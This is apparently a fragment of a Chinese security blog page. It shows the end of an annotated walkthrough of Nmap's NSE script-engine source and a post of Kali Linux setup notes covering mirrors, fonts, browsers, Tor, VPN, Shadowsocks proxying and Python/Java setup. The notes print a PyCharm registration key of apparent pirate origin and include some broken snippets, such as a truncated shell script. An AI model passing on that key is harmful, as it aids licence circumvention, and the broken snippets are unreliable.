class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///L_NSE用于保存Lua程序的状态  </span></span><br><span class="line"><span class="keyword">static</span> lua_State *L_NSE = <span class="literal">NULL</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">///open_nse用于创建Lua状态，准备Lua解释器环境  </span></span><br><span class="line"><span class="comment">///调用init_main()完成初始化操作。  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_nse</span> <span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="keyword">if</span> (L_NSE == <span class="literal">NULL</span>)    <span class="comment">///全局维护一份Lua状态  </span></span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     Set the random seed value on behalf of scripts.  Since Lua uses the </span></span><br><span class="line"><span class="comment">     C rand and srand functions, which have a static seed for the entire </span></span><br><span class="line"><span class="comment">     program, we don't want scripts doing this themselves. </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    srand(get_random_uint());  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">///创建Lua状态机，用于管理整个Lua程序的执行  </span></span><br><span class="line">    <span class="keyword">if</span> ((L_NSE = luaL_newstate()) == <span class="literal">NULL</span>)  </span><br><span class="line">      fatal(<span class="string">"%s: failed to open a Lua state!"</span>, SCRIPT_ENGINE);  </span><br><span class="line">    lua_atpanic(L_NSE, panic);  <span class="comment">///注册发生严重故障的回调函数为panic函数  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0  </span></span><br><span class="line">    <span class="comment">/* Lua 5.2 */</span>  </span><br><span class="line">    lua_pushcfunction(L_NSE, init_main);  </span><br><span class="line">    lua_pushlightuserdata(L_NSE, &amp;o.chosenScripts);  </span><br><span class="line">    <span class="keyword">if</span> (lua_pcall(L_NSE, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>))  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">    <span class="comment">///此处lua_cpcall()以保护模式执行C语言函数init_main()  </span></span><br><span class="line">    <span class="keyword">if</span> (lua_cpcall(L_NSE, init_main, &amp;o.chosenScripts))  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">      fatal(<span class="string">"%s: failed to initialize the script engine:\n%s\n"</span>, SCRIPT_ENGINE,   </span><br><span class="line">          lua_tostring(L_NSE, <span class="number">-1</span>));  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">///scipt_scan函数具体执行脚本扫描的过程  </span></span><br><span class="line"><span class="comment">///设置扫描状态；调用run_main()函数执行具体脚本扫描过程。  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">script_scan</span> <span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Target *&gt; &amp;targets, stype scantype)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="comment">///设置全局的扫描状态为此处状态（可能是SCRIPT_PRE_SCAN/SCRIPT_SCAN/SCRIPT_POST_SCAN）  </span></span><br><span class="line">  o.current_scantype = scantype;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">///断言L_NSE非空，并清空栈区（C与Lua调用交互过程均会在栈内完成）  </span></span><br><span class="line">  assert(L_NSE != <span class="literal">NULL</span>);  </span><br><span class="line">  lua_settop(L_NSE, <span class="number">0</span>); <span class="comment">/* clear the stack */</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0  </span></span><br><span class="line">  <span class="comment">/* Lua 5.2 */</span>  </span><br><span class="line">  lua_pushcfunction(L_NSE, run_main);  </span><br><span class="line">  lua_pushlightuserdata(L_NSE, &amp;targets);  </span><br><span class="line">  <span class="keyword">if</span> (lua_pcall(L_NSE, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>))  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">  <span class="comment">///此处lua_cpcall()以保护模式执行C语言函数run_main()  </span></span><br><span class="line">  <span class="keyword">if</span> (lua_cpcall(L_NSE, run_main, &amp;targets))  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">    error(<span class="string">"%s: Script Engine Scan Aborted.\nAn error was thrown by the "</span>  </span><br><span class="line">          <span class="string">"engine: %s"</span>, SCRIPT_ENGINE, lua_tostring(L_NSE, <span class="number">-1</span>));  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close_nse</span> <span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="comment">///关闭Lua状态  </span></span><br><span class="line">  <span class="keyword">if</span> (L_NSE != <span class="literal">NULL</span>)  </span><br><span class="line">  &#123;  </span><br><span class="line">    lua_close(L_NSE);  </span><br><span class="line">    L_NSE = <span class="literal">NULL</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init_main</span> <span class="params">(lua_State *L)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="keyword">char</span> path[MAXPATHLEN];  </span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; *rules = (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; *)  </span><br><span class="line">      lua_touserdata(L, <span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Load some basic libraries */</span>  </span><br><span class="line">  luaL_openlibs(L);       <span class="comment">///加载Lua自身的库  </span></span><br><span class="line">  set_nmap_libraries(L);  <span class="comment">///加载Nmap扩展的Lua库  </span></span><br><span class="line">  </span><br><span class="line">  lua_newtable(L);  </span><br><span class="line">  lua_setfield(L, LUA_REGISTRYINDEX, NSE_CURRENT_HOSTS);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Load debug.traceback for collecting any error tracebacks */</span>  </span><br><span class="line">  lua_settop(L, <span class="number">0</span>); <span class="comment">/* clear the stack */</span>  </span><br><span class="line">  lua_getglobal(L, <span class="string">"debug"</span>);  </span><br><span class="line">  lua_getfield(L, <span class="number">-1</span>, <span class="string">"traceback"</span>);  </span><br><span class="line">  lua_replace(L, <span class="number">1</span>); <span class="comment">// debug.traceback stack position 1  </span></span><br><span class="line">  lua_pushvalue(L, <span class="number">1</span>);  </span><br><span class="line">  lua_setfield(L, LUA_REGISTRYINDEX, NSE_TRACEBACK); <span class="comment">/* save copy */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Load main Lua code, stack position 2 */</span>  </span><br><span class="line">  <span class="comment">///将nse_main.lua文件加载进来，文件被转换为匿名函数（栈索引为2），后续调用lua_pcall()执行它。  </span></span><br><span class="line">  <span class="keyword">if</span> (nmap_fetchfile(path, <span class="keyword">sizeof</span>(path), <span class="string">"nse_main.lua"</span>) != <span class="number">1</span>)  </span><br><span class="line">    luaL_error(L, <span class="string">"could not locate nse_main.lua"</span>);  </span><br><span class="line">  <span class="keyword">if</span> (luaL_loadfile(L, path) != <span class="number">0</span>)  </span><br><span class="line">    luaL_error(L, <span class="string">"could not load nse_main.lua: %s"</span>, lua_tostring(L, <span class="number">-1</span>));  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The first argument to the NSE Main Lua code is the private nse </span></span><br><span class="line"><span class="comment">   * library table which exposes certain necessary C functions to </span></span><br><span class="line"><span class="comment">   * the Lua engine. </span></span><br><span class="line"><span class="comment">   */</span>  </span><br><span class="line">  <span class="comment">///加载提供给nse_main.lua调用的C语言函数表（栈索引为3）  </span></span><br><span class="line">  open_cnse(L); <span class="comment">// stack index 3  </span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The second argument is the script rules, including the </span></span><br><span class="line"><span class="comment">   * files/directories/categories passed as the userdata to this function. </span></span><br><span class="line"><span class="comment">   */</span>  </span><br><span class="line">  <span class="comment">///将脚本规则作为参数压入栈区（栈索引为4）  </span></span><br><span class="line">  lua_createtable(L, rules-&gt;size(), <span class="number">0</span>); <span class="comment">// stack index 4  </span></span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::iterator si = rules-&gt;begin();  </span><br><span class="line">       si != rules-&gt;end(); si++)  </span><br><span class="line">  &#123;  </span><br><span class="line">    lua_pushstring(L, si-&gt;c_str());  </span><br><span class="line">    lua_rawseti(L, <span class="number">4</span>, lua_objlen(L, <span class="number">4</span>) + <span class="number">1</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Get Lua main function */</span>  </span><br><span class="line">  <span class="comment">///调用由nse_main.lua转换后的匿名函数（栈索引2）：  </span></span><br><span class="line">  <span class="comment">///传入2个参数（栈索引3/4），输出1个结果（执行完毕后放在栈顶），  </span></span><br><span class="line">  <span class="comment">///错误处理函数对应的栈区索引为1（即debug.traceback）。  </span></span><br><span class="line">  <span class="comment">///功能：在nse_main.lua会加载用户选择的所有的脚本，并初始化Script/Thread类  </span></span><br><span class="line">  <span class="keyword">if</span> (lua_pcall(L, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>) != <span class="number">0</span>) lua_error(L); <span class="comment">/* we wanted a traceback */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">///将执行nse_main.lua返回的结果（nse_main.lua中的main函数对象）放入注册表中，  </span></span><br><span class="line">  <span class="comment">///以便后续的脚本扫描过程直接调用此main函数。  </span></span><br><span class="line">  lua_setfield(L, LUA_REGISTRYINDEX, NSE_MAIN);  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_main</span> <span class="params">(lua_State *L)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Target *&gt; *targets = (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Target*&gt; *)  </span><br><span class="line">      lua_touserdata(L, <span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">  lua_settop(L, <span class="number">0</span>); <span class="comment">///清空栈区  </span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* New host group */</span>  </span><br><span class="line">  lua_newtable(L);  <span class="comment">///清空当前主机组  </span></span><br><span class="line">  lua_setfield(L, LUA_REGISTRYINDEX, NSE_CURRENT_HOSTS);  </span><br><span class="line">    </span><br><span class="line">  <span class="comment">///读出error traceback函数  </span></span><br><span class="line">  lua_getfield(L, LUA_REGISTRYINDEX, NSE_TRACEBACK); <span class="comment">/* index 1 */</span>  </span><br><span class="line">    </span><br><span class="line">  <span class="comment">///获取nse_main.lua中的main()函数  </span></span><br><span class="line">  lua_getfield(L, LUA_REGISTRYINDEX, NSE_MAIN); <span class="comment">/* index 2 */</span>  </span><br><span class="line">  assert(lua_isfunction(L, <span class="number">-1</span>));  <span class="comment">///若不是函数，那此处必然有错  </span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The first and only argument to main is the list of targets. </span></span><br><span class="line"><span class="comment">   * This has all the target names, 1-N, in a list. </span></span><br><span class="line"><span class="comment">   */</span>  </span><br><span class="line">  <span class="comment">///main (hosts, scantype)  </span></span><br><span class="line">  <span class="comment">///main函数需要两个参数，被扫描的主机组与扫描类型（PRE/SCRIPT/POST）  </span></span><br><span class="line">  <span class="comment">///以下代码将逐次加入等待扫描主机到NSE_CURRENT_HOSTS表中  </span></span><br><span class="line">  lua_createtable(L, targets-&gt;size(), <span class="number">0</span>); <span class="comment">// stack index 3  </span></span><br><span class="line">  lua_getfield(L, LUA_REGISTRYINDEX, NSE_CURRENT_HOSTS); <span class="comment">/* index 4 */</span>  </span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Target *&gt;::iterator ti = targets-&gt;begin();  </span><br><span class="line">       ti != targets-&gt;end(); ti++)  </span><br><span class="line">  &#123;  </span><br><span class="line">    Target *target = (Target *) *ti;  </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *TargetName = target-&gt;TargetName();  </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *targetipstr = target-&gt;targetipstr();  </span><br><span class="line">    lua_newtable(L);  </span><br><span class="line">    set_hostinfo(L, target);  </span><br><span class="line">    lua_rawseti(L, <span class="number">3</span>, lua_objlen(L, <span class="number">3</span>) + <span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span> (TargetName != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strcmp</span>(TargetName, <span class="string">""</span>) != <span class="number">0</span>)  </span><br><span class="line">      lua_pushstring(L, TargetName);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">      lua_pushstring(L, targetipstr);  </span><br><span class="line">    lua_pushlightuserdata(L, target);  </span><br><span class="line">    lua_rawset(L, <span class="number">4</span>); <span class="comment">/* add to NSE_CURRENT_HOSTS */</span>  </span><br><span class="line">  &#125;  </span><br><span class="line">  lua_pop(L, <span class="number">1</span>); <span class="comment">/* pop NSE_CURRENT_HOSTS */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">///设置main()第二个参数，扫描类型  </span></span><br><span class="line">  <span class="comment">/* push script scan type phase */</span>  </span><br><span class="line">  <span class="keyword">switch</span> (o.current_scantype)  </span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="keyword">case</span> SCRIPT_PRE_SCAN:  </span><br><span class="line">      lua_pushstring(L, NSE_PRE_SCAN);  </span><br><span class="line">      <span class="keyword">break</span>;  </span><br><span class="line">    <span class="keyword">case</span> SCRIPT_SCAN:  </span><br><span class="line">      lua_pushstring(L, NSE_SCAN);  </span><br><span class="line">      <span class="keyword">break</span>;  </span><br><span class="line">    <span class="keyword">case</span> SCRIPT_POST_SCAN:  </span><br><span class="line">      lua_pushstring(L, NSE_POST_SCAN);  </span><br><span class="line">      <span class="keyword">break</span>;  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">      fatal(<span class="string">"%s: failed to set the script scan phase.\n"</span>, SCRIPT_ENGINE);  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">///以保护模式运行main()函数，两个参数，0个返回值，错误处理函数在栈区的index1位置  </span></span><br><span class="line">  <span class="keyword">if</span> (lua_pcall(L, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="number">0</span>) lua_error(L); <span class="comment">/* we wanted a traceback */</span>  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-kali-notes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-kali-notes/" class="post-title-link" itemprop="url">kali筆記</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 01:03:28" itemprop="dateCreated datePublished" datetime="2016-05-14T01:03:28+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:29:08" itemprop="dateModified" datetime="2019-07-25T14:29:08+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-kali-notes/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-kali-notes/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h2 id="Kali-linux-使用记录"><a href="#Kali-linux-使用记录" class="headerlink" title="Kali linux 使用记录"></a>Kali linux 使用记录</h2><p><img src="http://image.3001.net/images/20160130/14540858194014.png" alt=""></p>
+<h1 id="安装完Kali-linux-之后的配置-常用软件-记录"><a href="#安装完Kali-linux-之后的配置-常用软件-记录" class="headerlink" title="安装完Kali linux 之后的配置 常用软件 记录"></a>安装完Kali linux 之后的配置 常用软件 记录</h1><p>[TOC]</p>
+<h2 id="0x01-更换源并更新"><a href="#0x01-更换源并更新" class="headerlink" title="0x01 更换源并更新"></a>0x01 更换源并更新</h2><p><code>root@kali:~# leafpad /etc/apt/sources.list</code></p>
+<pre><code>#kali官方源 
+deb cdrom:[Debian GNU/Linux 2.0 _Sana_ - Official Snapshot i386 LIVE/INSTALL Binary 20150811-09:06]/ sana contrib main non-free
+deb cdrom:[Debian GNU/Linux 2.0 _Sana_ - Official Snapshot i386 LIVE/INSTALL Binary 20150811-09:06]/ sana contrib main non-free
+deb http://http.kali.org/kali sana main non-free contrib
+deb-src http://http.kali.org/kali sana main non-free contrib
+deb http://security.kali.org/kali-security/ sana/updates main contrib non-free
+deb-src http://security.kali.org/kali-security/ sana/updates main contrib non-free
+deb http://http.kali.org/kali kali main non-free contrib
+deb-src http://http.kali.org/kali kali main non-free contrib
+deb http://security.kali.org/kali-security kali/updates main contrib non-free
+
+#阿里云Kali源
+deb http://mirrors.aliyun.com/kali kali main non-free contrib
+deb-src http://mirrors.aliyun.com/kali kali main non-free contrib
+deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free
+
+#kali新加坡源的地址
+deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib
+deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib
+deb http://security.kali.org/kali-security kali/updates main contrib non-free
+deb http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free
+deb-src http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free
+
+#debian_wheezy国内源的地址
+deb http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib
+deb-src http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib
+deb http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib
+deb-src http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib
+deb http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib
+deb-src http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib
+deb http://mirrors.163.com/debian wheezy main non-free contrib
+deb-src http://mirrors.163.com/debian wheezy main non-free contrib
+deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
+deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
+deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
+deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
+
+#中科大kali源
+deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib
+deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib
+deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</code></pre><p>然后更新并安装</p>
+<p><code>root@kali:~# apt-get update &amp;&amp; apt-get dist-upgrade</code></p>
+<h2 id="0x02-安装内核头"><a href="#0x02-安装内核头" class="headerlink" title="0x02 安装内核头"></a>0x02 安装内核头</h2><p><code>root@kali:apt-get install linux-headers-$(uname -r)</code></p>
+<p>或者</p>
+<p><code>aptitude -r install linux-headers-$(uname -r</code></p>
+<h2 id="0x03-安装字体"><a href="#0x03-安装字体" class="headerlink" title="0x03 安装字体"></a>0x03 安装字体</h2><pre><code>apt-get install ttf-arphic-uming ttf-wqy-zenhei ttf-wqy-microhei ttf-arphic-ukai</code></pre><p>或者 ，自己下载字体包<br>把雅黑的ttf文件拷到/usr/share/fonts/的任意目录下，假设雅黑ttf叫做Yahei.ttf：</p>
+<pre><code>sudo mkdir -p /usr/share/fonts/vista
+sudo cp Yahei.ttf /usr/share/fonts/vista/</code></pre><p>然后，改变权限：</p>
+<p><code>sudo chmod 644 /usr/share/fonts/vista/*.ttf</code></p>
+<p>安装：</p>
+<pre><code>cd /usr/share/fonts/vista/
+sudo mkfontscale
+sudo mkfontdir
+sudo fc-cache -fv</code></pre><p>最后，去系统－首选项－高级设置 里修改 debain字体</p>
+<h2 id="0x04-安装浏览器"><a href="#0x04-安装浏览器" class="headerlink" title="0x04 安装浏览器"></a>0x04 安装浏览器</h2><ol>
+<li><p>自带浏览器汉化方法：</p>
+<p> <code>root@kali:apt-get install iceweasel-l10n-zh-cn</code></p>
+</li>
+<li><p>如果有强迫症删了系统自带浏览器，然后重新安装了一个新的火狐可能遇到的问题：</p>
+<p> 可能会出现gnome桌面被误删，从而导致系统进不去，并且即使你安装了一个新的火狐然后你就卸载不了了，会一直提示报错，并且此时如果你还想安装其他浏览器的话也会报错，如果真遇到的话你又不想重装系统有个治标不治本的方法（root@kali:sudo apt-get install –reinstall firefox-mozilla-build），还有说道如果桌面崩溃处理方法就是ctrl+alt+Fn(数字)进入非图形化界面然后重新安装下桌面环境。</p>
+</li>
+<li><p>安装谷歌浏览器</p>
+<p> 官网上下载谷歌浏览器（可能你访问不了，有时候等等还是可以出现下载链接的，如果访问不了去百度上搜索下然后下载个deb包），然后到下载目录安装下：root@kali:dpkg -i google-chrome-stable（具体以实际包的名称为准）。安装完之后，如果你是root运行，会提示你不给root执行的。解决方法：root@kali:gedit /usr/bin/google-chrome，然后在最后一行尾加入–user-data-dir（注意空格喔）。</p>
+</li>
+<li><p>安装Flash</p>
+<p> 首先<code>root@kali:apt-get install flashplugin-nonfree</code></p>
+<p> 其次<code>root@kali:update-flashplugin-nonfree –install</code></p>
+</li>
+<li><p>安装Tor Browser</p>
+<pre><code>root@kali:apt-get install tor 
+root@kali:service tor start 
+root@kali:proxychains iceweasel</code></pre></li>
+</ol>
+<h2 id="0x05-拼音输入法（需要注销重新登录）"><a href="#0x05-拼音输入法（需要注销重新登录）" class="headerlink" title="0x05 拼音输入法（需要注销重新登录）"></a>0x05 拼音输入法（需要注销重新登录）</h2><pre><code>apt-get install ibus ibus-pinyin              #经典的ibus
+apt-get install fcitx fcitx-pinyin fcitx-module-cloudpinyin fcitx-googlepinyin    #fcitx拼音</code></pre><h2 id="0x06-科学上网"><a href="#0x06-科学上网" class="headerlink" title="0x06 科学上网"></a>0x06 科学上网</h2><ul>
+<li><p>默认安装，是没有激活VPN的，能看到VPN选项，但是不能点击VPN连接</p>
+<pre><code>apt-get install -y pptpd network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome </code></pre></li>
+<li><p><a href="https://github.com/getlantern/lantern-binaries" target="_blank" rel="noopener">lantern</a></p>
+<p>  方法就是下载对应的版本，然后dpkg安装下，然后打开lantern自动跳转到浏览器，然后就没有然后了。。。</p>
+</li>
+<li><p>Shadowsocks</p>
+<p>  首先搭建shadowsocks客户端</p>
+<p>  git下 <a href="https://github.com/shadowsocks/shadowsocks-qt5" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-qt5</a> 以及其安装指南 <a href="https://github.com/shadowsocks/shadowsocks-qt5/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-qt5/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97</a></p>
+<p>  或者直接用pip安装</p>
+<p>  <code>pip install shadowsocks</code></p>
+<p>  <code>/usr/local/python/bin/sslocal   //ss位置</code></p>
+<p>  建立一个为ss.conf的配置文件</p>
+<pre><code>{
+&quot;server&quot; : &quot;100.100.100.100&quot;,
+&quot;server_port&quot; : 8888,
+&quot;local_port&quot; : 1080,
+&quot;password&quot; : &quot;123456&quot;,
+&quot;timeout&quot; : 600,
+&quot;method&quot; : &quot;aes-256-cfb&quot;
+}</code></pre><p>  然后运行</p>
+<p>  <code>sslocal -c /filepath/ss.conf</code></p>
+<p>  其次安装privoxy实现socks5转换成http</p>
+<p>  privoxy-3.0.23-stable-src.tar.gz   // <a href="http://www.privoxy.org/" target="_blank" rel="noopener">http://www.privoxy.org/</a> 官网下载源码</p>
+<pre><code>tar xf privoxy-3.0.23-stable-src.tar.gz   //解压缩
+cd privoxy-3.0.23-stable
+useradd privoxy                      //进入目录后创建privoxy用户，然后安装
+ autoheader &amp;&amp; autoconf
+./configure
+ make &amp;&amp; make install
+Vim /usr/local/etc/privoxy/config   修改配置文件
+listen-address 127.0.0.1:8118         //找到783行，去掉注释即可
+forward-socks5t / 127.0.0.1:1080.    //找到1336行，去掉注释即可，保证1080端口和ss配置中一致，注意1080后面与个小数点。</code></pre><p>  最后让终端走代理</p>
+<p>  <code>vim /ect/profile</code></p>
+<p>  添加两行</p>
+<pre><code>export http_proxy=http://127.0.0.1:8118
+export ftp_proxy=http://127.0.0.1:8118</code></pre><p>  然后打开shadowsocks privoxy</p>
+<pre><code>sslocal -c /filepath/ss.conf
+service privoxy start</code></pre><p>  测试<br>  <code>curl www.google.com</code><br>  访问谷歌即可，如果不行查看配置或者重启下。</p>
+</li>
+</ul>
+<h2 id="0x07-定制终端"><a href="#0x07-定制终端" class="headerlink" title="0x07 定制终端"></a>0x07 定制终端</h2><ul>
+<li><p>设置启动终端快捷键</p>
+<p>  系统》设置》快捷键<br>  添加如下命令：</p>
+<pre><code>gnome-terminal</code></pre><p>  然后设置 快捷启动终端的键（例如ctrl+alt+T）</p>
+</li>
+<li><p>多命令终端</p>
+<p>  byobu介绍 <a href="http://blog.csdn.net/lqhbupt/article/details/7786153" target="_blank" rel="noopener">http://blog.csdn.net/lqhbupt/article/details/7786153</a></p>
+</li>
+</ul>
+<h2 id="0x08-配置Python及Java环境"><a href="#0x08-配置Python及Java环境" class="headerlink" title="0x08 配置Python及Java环境"></a>0x08 配置Python及Java环境</h2><ul>
+<li><p>python IDE安装</p>
+<p>  下载最新的 tar 包，解压出来，进入 bin  , ./pycharm.sh 即可启动</p>
+<p>  3.1 pycharm 注册码</p>
+<pre><code>EMBRACE
+========= Sjolzy.cn =========
+14203-12042010
+0000107Iq75C621P7X1SFnpJDivKnX
+6zcwYOYaGK3euO3ehd1MiTT&quot;2!Jny8
+bff9VcTSJk7sRDLqKRVz1XGKbMqw3G
+=========== Sjolzy.cn =============</code></pre></li>
+<li><p>安装add-apt-repository和pip</p>
+<pre><code>add-apt-repository
+apt-get install python-software-properties 
+nano app-apt-repository.sh
+
+#!/bin/bash        // 添加如下代码
+if [ $# -eq 1 ]
+NM=`uname -a &amp;&amp; date`
+NAME=`echo $NM | md5sum | cut -f1 -d&quot; &quot;`</code></pre><p>  或者其他方法：<a href="http://www.blackmoreops.com/2014/02/21/kali-linux-add-ppa-repository-add-apt-repository/" target="_blank" rel="noopener">http://www.blackmoreops.com/2014/02/21/kali-linux-add-ppa-repository-add-apt-repository/</a>  Pip</p>
+<pre><code>apt-get python-setuptools
+easy_install pip
+pip gevent --upgrade</code></pre><p>  注：如果最后一步出错，执行<code>root@kali:pip install setuptools --no-use-wheel --upgrade</code></p>
+</li>
+<li><p>Java 环境安装</p>
+<p>  <code>mkdir /usr/lib/jdk</code></p>
+<p>  压缩包 cp 到 <code>/usr/lib/jdk</code><br>  解压之后配置环境变量</p>
+<p>  <code>gedit /etc/profile</code>  # 最末尾添加</p>
+<pre><code>export JAVA_HOME=/usr/lib/jdk/jdk1.7.0_03
+export JRE_HOME=/usr/lib/jdk/jdk1.7.0_03/jre
+export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH
+export CLASSPATH=$CLASSPATH:.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib</code></pre><p>  将系统默认的jdk修改过来，也就是java 和javac 命令有系统自带到换成你自己安装的</p>
